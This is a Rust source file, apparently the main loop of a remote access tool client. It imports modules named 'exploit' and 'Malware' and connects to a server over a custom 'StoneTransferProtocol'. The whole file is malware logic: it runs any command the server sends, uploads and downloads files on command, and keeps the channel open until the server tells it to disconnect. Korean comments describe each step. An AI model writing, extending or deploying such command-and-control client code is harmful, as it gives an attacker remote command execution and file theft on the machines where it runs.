mod exploit;
mod stprotocol;
mod structure;

use bstr::ByteSlice;
use exploit::{Exploits, Malware};
use std::io::{Read, Write};
use stprotocol::{Client, Session};
use structure::{Detector, Generator, StoneTransferProtocol, StructStone};

fn main() {
    event_loop(
        Session::new("127.0.0.1:6974".to_string()),
        StructStone::default(),
    )
}

fn event_loop(mut client: Session, mut packet: StructStone) {
    let mut exploit = Exploits::default();

    loop {
        // 새션 생성후 서버와 지속적인 통신을 위한 루프문

        packet = client.receiving(StructStone::default()); // 연결요청후 서버의 응답 대기

        println!("서버 응답타입: {:?}", packet.header_type());

        match packet.header_type() {
            // 서버의 응답 타입을 비교하여 보낼 요청을 생성함
            StoneTransferProtocol::ExecuteCmd => {
                // 타입이 ExecuteCmd 일 경우
                exploit.exploit_input = packet.get_command();
                client.exploit(exploit.execute());
            }
            StoneTransferProtocol::Download => {
                // 타입이 Download 일 경우
                client.download(packet);
            }
            StoneTransferProtocol::Upload => {
                // 타입이 Upload 일 경우
                client.upload(packet);
            }
            StoneTransferProtocol::Disconnect => {
                client.disconnect();
                break;
            } // 만약 서버의 응답이 Disconnect 일 경우 연결을 종료한다

            _ => client.send(packet.stone), //만약 위의 응답 타입을 제외한 응답을 보낼경우 서버의 응답과 같은 요청을 전송함
        };
    }
}
